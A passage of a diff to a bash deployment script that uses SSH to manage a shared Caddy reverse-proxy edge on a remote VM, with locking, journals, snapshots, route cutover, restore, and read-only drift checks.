+  edge_verify_networks
+}
+# A fresh lock fences writers, but does not make an old per-env pointer the
+# owner of global state. Bind rollback to the full unmanaged Caddy bytes and
+# Compose bytes last installed by this snapshot. Portal-only changes are merged
+# from live, never taken as evidence of ownership of the rest of the edge.
+edge_generation() {
+  local mode="$1" directory="$2" bounds
+  edge_plain_live || return $?
+  bounds="$(_edge_portal_bounds "$live")" || return $?
+  edge_owned || return $?
+  edge_bounded_run python3 -c '
+import hashlib,json,os,sys
+from pathlib import Path
+mode,directory,live,base,bounds,env,transaction=sys.argv[1:]
+record=Path(directory)/"edge/generation.json"
+def digest(data): return hashlib.sha256(data).hexdigest()
+data=Path(live).read_bytes()
+if bounds != "none":
+    first,last=map(int,bounds.split())
+    parts=data.split(b"\n")
+    lines=[part+b"\n" for part in parts[:-1]]+[parts[-1]]
+    data=b"".join(lines[:first-1]+lines[last:])
+state={"version":1,"unmanaged":digest(data),"compose":digest(Path(base).read_bytes())}
+if mode == "check":
+    try:
+        if record.is_symlink(): raise ValueError()
+        saved=json.loads(record.read_bytes())
+        if saved != state: raise ValueError()
+    except (OSError,ValueError):
+        print("stale or unproven global edge generation; refusing restore",file=sys.stderr)
+        sys.exit(75)
+else:
+    fd=os.open(record,os.O_WRONLY|os.O_CREAT|os.O_TRUNC|os.O_NOFOLLOW,0o600)
+    with os.fdopen(fd,"w") as stream:
+        json.dump(state,stream,sort_keys=True)
+        stream.flush(); os.fsync(stream.fileno())
+' "$mode" "$directory" "$live" "$base" "$bounds" "$env" "$transaction"
+}
+
+edge_snapshot() {
+  edge_plain_live || return $?
+  if [[ -e "$transaction_dir/edge.ready" ]]; then
+    edge_generation check "$transaction_dir" || return $?
+  fi
+  edge_op install -d -m 700 -- "$transaction_dir/edge" || return $?
+  local name source destination
+  for name in Caddyfile docker-compose.caddy.yml; do
+    source="$edge_dir/$name"; destination="$transaction_dir/edge/$name"
+    if [[ -e "$destination" || -L "$destination" ]]; then
+      [[ -f "$destination" && ! -L "$destination" ]] || return 2
+    else
+      edge_copy "$source" "$destination" || return $?
+    fi
+  done
+  if [[ ! -e "$transaction_dir/edge/Caddyfile.pre-cutover" ]]; then
+    edge_copy "$live" "$transaction_dir/edge/Caddyfile.pre-cutover" || return $?
+  fi
+  if [[ ! -e "$transaction_dir/edge.ready" ]]; then
+    edge_generation record "$transaction_dir" || return $?
+  fi
+  edge_emit "$transaction_dir/edge.ready" ready || return $?
+  edge_emit "$backup_root/$env/edge-cutover.current" "$transaction_dir/edge/Caddyfile.pre-cutover"
+}
+edge_route_count() {
+  awk -v route="$1:8000" '$1 == "reverse_proxy" && NF == 2 && $2 == route { n++ } END { print n+0 }' "$2"
+}
+
+edge_desired() {
+  local scratch="$1" encoded_caddy="$2" encoded_compose="$3" model inventory
+  edge_op bash -c 'printf "%s" "$1" | base64 -d >"$2"' _ "$encoded_caddy" "$scratch/Caddyfile.repo" || return $?
+  edge_op bash -c 'printf "%s" "$1" | base64 -d >"$2"' _ "$encoded_compose" "$scratch/compose.repo.yml" || return $?
+  edge_merge "$scratch/Caddyfile.repo" "$scratch/Caddyfile" || return $?
+  model="$(edge_op docker compose --project-directory "$edge_dir" -f "$scratch/compose.repo.yml" config --format json)" || return $?
+  inventory="$(edge_op docker network ls --format '{{.Name}}')" || return $?
+  # Compose emits resolved actual names. Only absent, unselected Aura networks
+  # are omitted: a dev rollout must not create staging or production resources.
+  edge_op python3 -c '
+import json,re,sys
+model,inventory,env=sys.argv[1:]
+d=json.loads(model); present=set(inventory.splitlines())
+if not all(re.fullmatch(r"[A-Za-z0-9_.-]+", n) for n in present): raise SystemExit(2)
+nets=d["networks"]; service=d["services"]["caddy"]["networks"]
+selected="acx-"+env+"-net"
+for key in list(service):
+    name=nets[key].get("name",key)
+    if re.fullmatch(r"acx-(dev|staging|prod)-auraface-net",name) and name not in present and name != selected:
+        if isinstance(service,list): service.remove(key)
+        else: del service[key]
+        del nets[key]
+print(json.dumps(d,sort_keys=True,separators=(",",":")))' "$model" "$inventory" "$env" | edge_op tee -- "$scratch/docker-compose.caddy.yml" >/dev/null
+}
+
+case "$action" in
+  admit)
+    handle="$(edge_lock_acquire "$lock" 0 3600 0)" || exit $?
+    rc=0
+    if [[ -e "$journal" || -L "$journal" ]]; then
+      echo 'pending activation journal; recovery required before deploy effects' >&2
+      rc=75
+    fi
+    edge_lock_release "$handle" 5 || rc=$?
+    exit "$rc"
+    ;;
+  probe|converge)
+    temporary_handle=0
+    if [[ "$action" == probe && -z "$handle" ]]; then
+      handle="$(edge_lock_acquire "$lock" 0 3600 0)" || exit $?
+      probe_without_journal=1
+      temporary_handle=1
+      trap 'rc=$?; if edge_lock_release "$handle" 5 >/dev/null; then :; else rc=1; fi; exit "$rc"' EXIT
+    fi
+    edge_owned || exit $?
+    scratch="$(edge_op mktemp -d "$edge_dir/.recognition-edge.XXXXXX")" || exit $?
+    edge_desired "$scratch" "$1" "$2" || exit $?
+    caddy_drift=0; compose_drift=0; member=1
+    cmp -s -- "$scratch/Caddyfile" "$live" || caddy_drift=1
+    if [[ -f "$base" && ! -L "$base" ]]; then
+      current="$(edge_op docker compose --project-directory "$edge_dir" -f "$base" config --format json)" || exit $?
+      canonical="$(edge_op python3 -c 'import json,sys; print(json.dumps(json.loads(sys.argv[1]),sort_keys=True,separators=(",",":")))' "$current")" || exit $?
+      [[ "$canonical" == "$(cat -- "$scratch/docker-compose.caddy.yml")" ]] || compose_drift=1
+      rc=0; edge_verify_networks || rc=$?
+      if ((rc == 1)); then member=0; compose_drift=1; elif ((rc != 0)); then exit "$rc"; fi
+    else
+      compose_drift=1; member=0
+    fi
+    if [[ "$action" == probe ]]; then
+      edge_op rm -rf -- "$scratch" || exit $?
+      printf '%s %s %s\n' "$caddy_drift" "$compose_drift" "$member"
+      exit 0
+    fi
+    edge_snapshot || exit $?
+    edge_op docker run --rm -v "$scratch/Caddyfile:/etc/caddy/Caddyfile:ro" caddy:2-alpine caddy validate --config /etc/caddy/Caddyfile || exit $?
+    edge_copy "$scratch/Caddyfile" "$live" || exit $?
+    edge_copy "$scratch/docker-compose.caddy.yml" "$base" || exit $?
+    edge_generation record "$transaction_dir" || exit $?
+    # Only create this rollout's network; inventory failure is never absence.
+    inventory="$(edge_op docker network ls --format '{{.Name}}')" || exit $?
+    selected="acx-$env-net"
+    if [[ "$env" == dev-fir || "$env" == *-auraface ]]; then
+      if ! grep -Fxq -- "$selected" <<<"$inventory"; then
+        edge_op docker network create --label com.docker.compose.network=backend --label "com.docker.compose.project=acx-$env" "$selected" || exit $?
+      fi
+    fi
+    mode=reload; ((compose_drift == 0)) || mode=recreate
+    edge_apply "$mode" || exit $?
+    edge_op rm -rf -- "$scratch"
+    ;;
+  acquire)
+    wait_seconds="$1"; hold_seconds="$2"
+    # Explicitly capture stdout: the handle, never the lock pathname, is ownership.
+    handle="$(edge_lock_acquire "$lock" "$wait_seconds" "$hold_seconds" 0)" || exit $?
+    if [[ -e "$journal" || -L "$journal" || -e "$transaction_dir" || -L "$transaction_dir" ]]; then
+      echo 'pending activation journal or reused transaction snapshot; recover its owner before recognition writes' >&2
+      edge_lock_release "$handle" 5 >/dev/null || :
+      exit 75
+    fi
+    edge_lock_check "$handle" "$((budget + EDGE_OP_KILL_GRACE))" || exit $?
+    if ! edge_bounded_run python3 -c '
+import os,sys
+path,env,transaction,handle=sys.argv[1:]
+fd=os.open(path,os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
+with os.fdopen(fd,"w") as stream:
+    stream.write("version=recognition-edge-1\nenv="+env+"\ntransaction="+transaction+"\nhandle="+handle+"\n")
+    stream.flush(); os.fsync(stream.fileno())
+fd=os.open(os.path.dirname(path),os.O_RDONLY|os.O_DIRECTORY)
+try: os.fsync(fd)
+finally: os.close(fd)' "$journal" "$env" "$transaction" "$handle"; then
+      edge_lock_release "$handle" 5 >/dev/null || :
+      exit 1
+    fi
+    printf '%s\n' "$handle"
+    ;;
+  release)
+    # Release cannot license journal deletion after ownership is lost.
+    edge_lock_release "$handle" 5
+    ;;
+  finish)
+    edge_owned || exit $?
+    edge_emit "$journal" "version=recognition-edge-1
+env=$env
+transaction=$transaction
+handle=$handle
+phase=completed" || exit $?
+    # Keep the journal until release is proven. Reacquire before deleting the
+    # completion record; contenders see a pending journal and refuse visibly.
+    edge_lock_release "$handle" 5 || exit $?
+    old_handle="$handle"
+    handle="$(edge_lock_acquire "$lock" 0 3600 0)" || exit $?
+    edge_lock_check "$handle" "$((budget + EDGE_OP_KILL_GRACE))" || exit $?
+    grep -Fxq "handle=$old_handle" "$journal" && grep -Fxq 'phase=completed' "$journal" || { edge_lock_release "$handle" 5 >/dev/null; exit 3; }
+    rc=0
+    edge_bounded_run rm -f -- "$journal" || rc=$?
+    edge_lock_release "$handle" 5 || rc=$?
+    exit "$rc"
+    ;;
+  install)
+    edge_owned || exit $?
+    destination="$1"; encoded="$2"; permissions="$3"
+    case "$destination" in
+      "$edge_dir/$env/"*|"/etc/systemd/system/acx-$env.service"|"/etc/systemd/system/acx-$env-next.service") ;;
+      *) exit 2 ;;
+    esac
+    [[ "$destination" != *..* && "$destination" != *[!A-Za-z0-9_./-]* && "$permissions" == 644 ]] || exit 2
+    staged="$(edge_op mktemp "$edge_dir/.recognition-file.XXXXXX")" || exit $?
+    edge_op bash -c 'printf "%s" "$1" | base64 -d >"$2"' _ "$encoded" "$staged" || exit $?
+    edge_copy "$staged" "$destination" || exit $?
+    edge_op chmod "$permissions" -- "$destination" || exit $?
+    if [[ "$destination" == /etc/systemd/system/* ]]; then edge_op systemctl daemon-reload || exit $?; fi
+    edge_op rm -f -- "$staged"
+    ;;
+  command)
+    edge_owned || exit $?
+    # Fence each mutating tool inside this SSH operation, including commands
+    # in snapshot functions and fallbacks. Python and nested receipt producers
+    # also use the same read-only check at their internal commit points.
+    ACX_RECOGNITION_OWNERSHIP_CHECK="$(declare -f)
+$(declare -p EDGE_OP_DEADLINE EDGE_OP_MAX_DEADLINE EDGE_OP_KILL_GRACE)
+$(declare -p handle budget journal env transaction)
+edge_owned"
+    export ACX_RECOGNITION_OWNERSHIP_CHECK
+    sudo() { edge_owned || exit 75; command sudo "$@"; }
+    docker() { edge_owned || exit 75; command docker "$@"; }
+    systemctl() { edge_owned || exit 75; command systemctl "$@"; }
+    python3() { edge_owned || exit 75; command python3 "$@"; }
+    eval "$1"
+    ;;
+  check)
+    edge_owned
+    ;;
+  snapshot)
+    edge_owned || exit $?
+    edge_snapshot
+    ;;
+  flip)
+    edge_owned || exit $?
+    target="$1"; digest="$2"
+    [[ "$target" == next || "$target" == canonical ]] || exit 2
+    [[ "$target" != next || "$digest" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]] || exit 2
+    edge_snapshot || exit $?
+    scratch="$transaction_dir/edge/flip.base"
+    candidate="$transaction_dir/edge/flip.candidate"
+    edge_unmanaged "$live" "$scratch" || exit $?
+    from="$env-api"; to="$env-api-next"
+    if [[ "$target" == canonical ]]; then from="$env-api-next"; to="$env-api"; fi
+    [[ "$(edge_route_count "$from" "$scratch")" == 1 && "$(edge_route_count "$to" "$scratch")" == 0 ]] || {
+      echo 'expected exactly one unambiguous source route outside the portal block' >&2; exit 1;
+    }
+    edge_op sed -E "s|(^[[:space:]]*reverse_proxy[[:space:]]+)$from:8000([[:space:]]*)$|\\1$to:8000\\2|" "$scratch" |
+      edge_op tee -- "$scratch.changed" >/dev/null
+    [[ "$(edge_route_count "$to" "$scratch.changed")" == 1 && "$(edge_route_count "$from" "$scratch.changed")" == 0 ]] || exit 1
+    edge_merge "$scratch.changed" "$candidate" || exit $?
+    edge_select || exit $?
+    edge_op docker run --rm -v "$candidate:/etc/caddy/Caddyfile:ro" caddy:2-alpine caddy validate --config /etc/caddy/Caddyfile || exit $?
+    if [[ "$target" == next ]]; then
+      edge_emit "$backup_root/$env/cutover-inflight" "env=$env
+digest=$digest
+transaction=$transaction
+next_unit=acx-$env-next
+status=traffic_on_next" || exit $?
+    fi
+    # cp writes through the existing regular file: the Caddy bind inode survives.
+    edge_copy "$candidate" "$live" || exit $?
+    edge_generation record "$transaction_dir" || exit $?
+    edge_apply reload || exit $?
+    if [[ "$target" == canonical ]]; then
+      edge_emit "$backup_root/$env/cutover-committed" "status=canonical
+transaction=$transaction" || exit $?
+      edge_op rm -f -- "$backup_root/$env/cutover-inflight" || exit $?
+    fi
+    ;;
+  restore)
+    edge_owned || exit $?
+    mode="$1"
+    source_dir="$transaction_dir"
+    if [[ ! -f "$source_dir/edge.ready" ]]; then
+      if [[ "$mode" == current-only ]]; then exit 0; fi
+      pointer="$backup_root/$env/edge-cutover.current"
+      [[ -f "$pointer" && ! -L "$pointer" ]] || { echo 'missing verified edge snapshot; refusing' >&2; exit 1; }
+      pointed="$(cat -- "$pointer")"
+      case "$pointed" in "$backup_root/$env/"*/edge/Caddyfile.pre-cutover) ;; *) exit 2 ;; esac
+      [[ "$pointed" != *..* ]] || exit 2
+      source_dir="${pointed%/edge/Caddyfile.pre-cutover}"
+    fi
+    edge_generation check "$source_dir" || exit $?
+    source="$source_dir/edge/Caddyfile.pre-cutover"
+    [[ -f "$source" && ! -L "$source" ]] || exit 2
+    edge_op install -d -m 700 -- "$transaction_dir/edge" || exit $?
+    source_bounds="$(_edge_portal_bounds "$source")" || exit $?
+    live_bounds="$(_edge_portal_bounds "$live")" || exit $?
+    if python3 -c '
+import sys
+from pathlib import Path
+def block(path,bounds):
+    if bounds == "none": return b""
+    first,last=map(int,bounds.split())
+    parts=Path(path).read_bytes().split(b"\n")
+    lines=[part+b"\n" for part in parts[:-1]]+[parts[-1]]
+    return b"".join(lines[first-1:last])
+sys.exit(0 if block(sys.argv[1],sys.argv[2]) == block(sys.argv[3],sys.argv[4]) else 1)' "$source" "$source_bounds" "$live" "$live_bounds"; then
+      edge_copy "$source" "$transaction_dir/edge/restore.candidate" || exit $?
+    else
+      edge_unmanaged "$source" "$transaction_dir/edge/restore.base" || exit $?
+      edge_merge "$transaction_dir/edge/restore.base" "$transaction_dir/edge/restore.candidate" || exit $?
+    fi
+    edge_copy "$transaction_dir/edge/restore.candidate" "$live" || exit $?
+    if [[ -f "$source_dir/edge/docker-compose.caddy.yml" ]]; then
+      edge_copy "$source_dir/edge/docker-compose.caddy.yml" "$base" || exit $?
+      edge_generation record "$source_dir" || exit $?
+      edge_apply recreate || exit $?
+    else
+      edge_generation record "$source_dir" || exit $?
+      edge_apply reload || exit $?
+    fi
+    ;;
+  *) echo 'unknown recognition edge action' >&2; exit 2 ;;
+esac
+EDGE_PROGRAM
+}
+
+recognition_edge_remote() {
+  local action="$1" env="$2" timeout program command arg app_root
+  shift 2
+  env_to_unit "$env" >/dev/null || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)" || return 1
+  [[ "$timeout" =~ ^[1-9][0-9]{0,2}$ && "$timeout" -le 600 ]] || {
+    warn "edge command deadline cannot exceed 600 seconds"
+    return 2
+  }
+  app_root="${APP_ROOT:-/opt/acx-backend/app}"
+  [[ "$app_root" == /* && "$app_root" != *..* && "$app_root" != *[!A-Za-z0-9_./-]* ]] || return 2
+  program="$(recognition_edge_program)" || return $?
+  command="sudo timeout -k 5 ${timeout} bash -s --"
+  for arg in "$action" "$app_root" "${ACX_EDGE_HANDLE:-}" "$timeout" "$env" "${ACX_DEPLOY_TRANSACTION_ID}" "${ACX_DEPLOY_BACKUP_ROOT}" "$@"; do
+    command+=" $(remote_quote "$arg")"
+  done
+  run_with_deadline "$((timeout + 6))" "recognition edge ${action} for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 -l "${OCI_USER}" -- "${OCI_HOST}" "$command" <<<"$program"
+}
+
+# Execute a target mutation with the same owned handle and journal on the
+# target, including protected mutations within snapshots and compensation.
+recognition_edge_install() {
+  local destination="$1" content="$2" encoded
+  recognition_edge_assert_if_active || return 75
+  encoded="$(printf '%s' "$content" | python3 -c 'import base64,sys; print(base64.b64encode(sys.stdin.buffer.read()).decode())')" || return $?
+  recognition_edge_remote install "$ACX_EDGE_ENV" "$destination" "$encoded" 644
+}
+
+recognition_edge_command() {
+  recognition_edge_assert_if_active || return 75
+  recognition_edge_remote command "$ACX_EDGE_ENV" "$1"
+}
+
+recognition_edge_begin() {
+  local env="$1" handle
+  if [[ -n "${ACX_EDGE_HANDLE:-}" ]]; then
+    [[ "${ACX_EDGE_ENV:-$env}" == "$env" ]] || return 2
+    recognition_edge_remote check "$env"
+    return $?
+  fi
+  handle="$(recognition_edge_remote acquire "$env" 0 3600)" || return $?
+  [[ "$handle" =~ ^/[A-Za-z0-9_./-]+$ && "$handle" != *..* ]] || return 2
+  ACX_EDGE_HANDLE="$handle"
+  ACX_EDGE_ENV="$env"
+}
+recognition_edge_assert_if_active() {
+  [[ -n "${ACX_EDGE_HANDLE:-}" ]] || {
+    warn "edge ownership missing; refusing mutation"
+    return 75
+  }
+  if ! recognition_edge_remote check "${ACX_EDGE_ENV:-${1:-}}"; then
+    warn "edge ownership lost; retaining journal and refusing all continued compensation"
+    return 75
+  fi
+}
+
+recognition_edge_finish() {
+  [[ -n "${ACX_EDGE_HANDLE:-}" ]] || return 0
+  recognition_edge_remote finish "$ACX_EDGE_ENV" || return $?
+  ACX_EDGE_HANDLE=""
+  ACX_EDGE_ENV=""
+}
+recognition_edge_release() {
+  [[ -n "${ACX_EDGE_HANDLE:-}" ]] || return 0
+  recognition_edge_remote release "$ACX_EDGE_ENV" || return $?
+  ACX_EDGE_HANDLE=""
+  ACX_EDGE_ENV=""
+}
+
+prepare_runtime_topology_backups() {
+  local env="$1" edge_apply_edge="${2:-0}" remote_dir unit edge_dir timeout
+  recognition_edge_begin "$env" || return $?
+  recognition_edge_assert_if_active || return 75
+  if [[ "$edge_apply_edge" == 1 ]]; then
+    recognition_edge_begin "$env" || return $?
+    recognition_edge_remote snapshot "$env" || return $?
+  fi
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  edge_dir="/opt/acx-backend"
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  [[ "${edge_apply_edge}" == "0" || "${edge_apply_edge}" == "1" ]] || return 1
+  log "Snapshotting compose/unit topology for ${env} before mutation"
+  recognition_edge_command "set -euo pipefail
+     backup_root='${ACX_DEPLOY_BACKUP_ROOT}'
+     backup_dir=\"\$backup_root/${env}/${ACX_DEPLOY_TRANSACTION_ID}\"
+     sudo install -d -m 700 -- \"\$backup_dir\" \"\$backup_dir/edge\"
+     sudo install -d -m 700 -- \"\$backup_dir\" \"\$backup_dir/db-init\"
+     sudo touch -- \"\$backup_dir/topology.pending\"
+     snapshot_one() {
+       live=\"\$1\"; snapshot=\"\$2\"; compatibility=\"\$3\"; absent=\"\$4\"
+       sudo test ! -L \"\$live\" && sudo test ! -L \"\$snapshot\" || { echo 'symlink topology state refused' >&2; return 1; }
+       if sudo test -f \"\$snapshot.absent\" && sudo test -e \"\$live\"; then
+         echo 'immutable prior-absence snapshot conflicts with live state' >&2; return 1
+       fi
+       if sudo test -f \"\$snapshot\" && ! sudo test -e \"\$live\"; then
+         echo 'immutable topology snapshot conflicts with missing live state' >&2; return 1
+       fi
+       if sudo test -e \"\$live\"; then
+         sudo test -f \"\$live\" || { echo \"topology path is not a regular file: \$live\" >&2; return 1; }
+         if sudo test -e \"\$snapshot\"; then
+           sudo cmp -s -- \"\$live\" \"\$snapshot\" || { echo \"immutable topology snapshot changed: \$snapshot\" >&2; return 1; }
+         else
+           sudo cp -p -- \"\$live\" \"\$snapshot\"
+         fi
+         sudo cmp -s -- \"\$live\" \"\$snapshot\" || { echo \"topology snapshot verification failed: \$snapshot\" >&2; return 1; }
+         sudo cp -p -- \"\$live\" \"\$compatibility\"
+         sudo cmp -s -- \"\$live\" \"\$compatibility\" || { echo \"compatibility topology backup verification failed: \$compatibility\" >&2; return 1; }
+         sudo rm -f -- \"\$absent\"
+       else
+         sudo rm -f -- \"\$snapshot\" \"\$compatibility\"
+         sudo touch -- \"\$absent\" \"\$snapshot.absent\"
+         sudo test -f \"\$absent\" || { echo \"prior-absence marker could not be created: \$absent\" >&2; return 1; }
+       fi
+     }
+     snapshot_one '${remote_dir}/docker-compose.env.yml' \"\$backup_dir/docker-compose.env.yml\" '${remote_dir}/docker-compose.env.yml.bak' '${remote_dir}/docker-compose.env.yml.bak.absent'
+     snapshot_one '/etc/systemd/system/${unit}.service' \"\$backup_dir/${unit}.service\" '/etc/systemd/system/${unit}.service.bak' '/etc/systemd/system/${unit}.service.bak.absent'
+     if [ '${env}' = prod ]; then
+       snapshot_one '${remote_dir}/docker-compose.admin.yml' \"\$backup_dir/docker-compose.admin.yml\" '${remote_dir}/docker-compose.admin.yml.bak' '${remote_dir}/docker-compose.admin.yml.bak.absent'
+     fi
+     snapshot_one '${remote_dir}/db/docker-prod-init/001-extensions.sql' \"\$backup_dir/db-init/001-extensions.sql\" '${remote_dir}/001-extensions.sql.bak' '${remote_dir}/001-extensions.sql.bak.absent'
+     sudo touch -- \"\$backup_dir/db-init.ready\"
+     sudo touch -- \"\$backup_dir/topology.ready\"
+     printf '%s\\n' \"\$backup_dir\" | sudo tee \"\$backup_root/${env}/latest\" >/dev/null
+     sudo rm -f -- \"\$backup_dir/topology.pending\""
+}
+
+recognition_edge_inputs() {
+  ACX_EDGE_CADDY_INPUT="$(python3 -c 'import base64,sys; print(base64.b64encode(open(sys.argv[1],"rb").read()).decode())' "${SERVICE_DIR}/Caddyfile")" || return 1
+  ACX_EDGE_COMPOSE_INPUT="$(python3 -c 'import base64,sys; print(base64.b64encode(open(sys.argv[1],"rb").read()).decode())' "${SERVICE_DIR}/docker-compose.caddy.yml")" || return 1
+}
+
+converge_runtime() {
+  local env="$1" remote_dir unit probe caddy_drift compose_drift member apply=0 timeout
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)" || return 1
+  recognition_edge_inputs || return 1
+  probe="$(recognition_edge_remote probe "$env" "$ACX_EDGE_CADDY_INPUT" "$ACX_EDGE_COMPOSE_INPUT")" || return $?
+  [[ "$probe" =~ ^[01]\ [01]\ [01]$ ]] || return 1
+  read -r caddy_drift compose_drift member <<<"$probe"
+  if ((caddy_drift || compose_drift)); then
+    if [[ "${ACX_EDGE_APPLY:-0}" == 1 ]]; then
+      apply=1
+    elif [[ "$env" == dev-fir ]] || is_aura_env "$env"; then
+      warn "caddy edge drift detected for ${env}; ACX_EDGE_APPLY=1 required before any runtime writes"
+      return 1
+    else
+      warn "edge drift present; preserving generic env-only convergence"
+    fi
+  fi
+  recognition_edge_begin "$env" || return $?
+  prepare_runtime_topology_backups "$env" "$apply" || return $?
+  _ship_runtime_file() {
+    local src="$1" dest="$2" encoded
+    recognition_edge_assert_if_active || return 75
+    encoded="$(python3 -c 'import base64,sys; print(base64.b64encode(open(sys.argv[1],"rb").read()).decode())' "$src")" || return $?
+    recognition_edge_remote install "$ACX_EDGE_ENV" "$dest" "$encoded" 644
+  }
+  recognition_edge_command "sudo install -d -m 755 -- $(remote_quote "$remote_dir/db/docker-prod-init")" || return $?
+  _ship_runtime_file "$SERVICE_DIR/db/docker-prod-init/001-extensions.sql" "$remote_dir/db/docker-prod-init/001-extensions.sql" || return $?
+  _ship_runtime_file "$SERVICE_DIR/docker-compose.env.yml" "$remote_dir/docker-compose.env.yml" || return $?
+  if [[ "$env" == prod ]]; then
+    _ship_runtime_file "$SERVICE_DIR/docker-compose.admin.yml" "$remote_dir/docker-compose.admin.yml" || return $?
+  fi
+  install_rendered_unit "$env" || return $?
+  if ((apply)); then
+    recognition_edge_remote converge "$env" "$ACX_EDGE_CADDY_INPUT" "$ACX_EDGE_COMPOSE_INPUT" || return $?
+  fi
+}
+
+# Read-only drift gate: diff the deployed compose/unit against the repo and exit
+# non-zero on any drift, without mutating the VM. Operator triage for `--check`.
+# Transport failures must never be misread as drift (gate r08117ab7 RA-03/RB-04):
+# each arm captures the ssh exit status before diffing; ssh rc=255 or deadline
+# rc=124 → fail with a transport-error message. Missing files (cat exit 1) are drift.
+converge_check() {
+  local env="$1" remote_dir unit drift=0 rendered
+  local remote_tmp ssh_rc command_timeout inspect_timeout fir_net="acx-dev-fir-net"
+  command_timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  unit="$(env_to_unit "$env")" || return 1
+  log "Checking runtime drift for ${env} on ${SSH_TARGET} (read-only)"
+  remote_tmp="$(mktemp)"
+  # shellcheck disable=SC2064
+  trap "rm -f '${remote_tmp}'" RETURN
+  # fail() calls `exit 1`, which does NOT run RETURN traps — every abort path
+  # must rm explicitly or --check leaks /tmp/tmp.* (gate r0811e5db V-02).
+  _cc_fail() {
+    rm -f "${remote_tmp}"
+    fail "$@"
+  }
+
+  _check_remote_file() {
+    # Fetch remote path into remote_tmp; compare to local. Sets drift on
+    # content/missing-file mismatch. Aborts on ssh transport failure.
+    local remote_path="$1" local_path="$2" label="$3"
+    ssh_rc=0
+    run_with_deadline "${command_timeout}" "remote ${label} read for ${env}" \
+      ssh -o BatchMode=yes -o ConnectTimeout="${command_timeout}" -o ConnectionAttempts=1 \
+      -o ServerAliveInterval="${command_timeout}" -o ServerAliveCountMax=1 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_path}'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
+    if ((ssh_rc == 255 || ssh_rc == 124)); then
+      _cc_fail "cannot read remote ${label} on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
+    fi
+    if ((ssh_rc != 0)); then
+      # Non-transport failure (typically cat exit 1 = missing file) → drift.
+      warn "drift: ${label} on ${env} differs from repo (or is missing)"
+      drift=1
+      return 0
+    fi
+    if ! diff -u "${remote_tmp}" "${local_path}" >/dev/null; then
+      diff -u "${remote_tmp}" "${local_path}" || true
+      warn "drift: ${label} on ${env} differs from repo (or is missing)"
+      drift=1
+    fi
+  }
+
+  _check_remote_file \
+    "${remote_dir}/docker-compose.env.yml" \
+    "${SERVICE_DIR}/docker-compose.env.yml" \
+    "docker-compose.env.yml"
+  if [[ "$env" == "prod" ]]; then
+    _check_remote_file \
+      "${remote_dir}/docker-compose.admin.yml" \
+      "${SERVICE_DIR}/docker-compose.admin.yml" \
+      "docker-compose.admin.yml"
+  fi
+  if rendered="$(render_unit "$env")"; then
+    :
+  else
+    ssh_rc=$?
+    _cc_fail "cannot render ${unit}.service on ${SSH_TARGET} (exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
+  fi
+  ssh_rc=0
+  run_with_deadline "${command_timeout}" "remote ${unit}.service read for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout="${command_timeout}" -o ConnectionAttempts=1 \
+    -o ServerAliveInterval="${command_timeout}" -o ServerAliveCountMax=1 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
+  if ((ssh_rc == 255 || ssh_rc == 124)); then
+    _cc_fail "cannot read remote ${unit}.service on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
+  elif ((ssh_rc != 0)); then
+    warn "drift: ${unit}.service on ${env} differs from repo template (or is missing)"
+    drift=1
+  elif ! diff -u "${remote_tmp}" <(printf '%s\n' "$rendered") >/dev/null; then
+    diff -u "${remote_tmp}" <(printf '%s\n' "$rendered") || true
+    warn "drift: ${unit}.service on ${env} differs from repo template (or is missing)"
+    drift=1
+  fi
+  # Edge drift arm: converge_runtime now owns the shared caddy edge, so the
+  # read-only gate must surface edge drift too or --check reports clean while
+  # FIR routing / caddy net membership is stale (gate r0811864a B-04).
+  local edge_probe
+  recognition_edge_inputs || _cc_fail "cannot read repo edge inputs"
+  edge_probe="$(recognition_edge_remote probe "$env" "$ACX_EDGE_CADDY_INPUT" "$ACX_EDGE_COMPOSE_INPUT")" || _cc_fail "cannot inspect effective shared edge generation"
+  [[ "$edge_probe" == "0 0 1" ]] || drift=1
+  if ((drift)); then
+    _cc_fail "runtime drift detected for ${env}; run '$0 deploy ${env}' to converge"
+  fi
+  log "no runtime drift for ${env} (compose + unit match repo)"
+}
+
+# Return the immutable image ID of the api container that is actually serving
+# the environment. Config.Image is only the mutable compose tag and therefore
+# cannot establish rollback provenance.
+read_running_api_image_id() {
+  local env="$1" remote_dir compose_files remote_dir_q timeout image_id rc=0
+  remote_dir="$(env_to_remote_dir "${env}")" || return 1
+  compose_files="$(env_to_compose_files "${env}")" || return 1
+  remote_dir_q="$(remote_quote "${remote_dir}")"
+  timeout="${ACX_REMOTE_INSPECT_TIMEOUT:-60}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_REMOTE_INSPECT_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split remotely.
+  image_id="$(run_with_deadline "${timeout}" "running image inspection for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+    -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
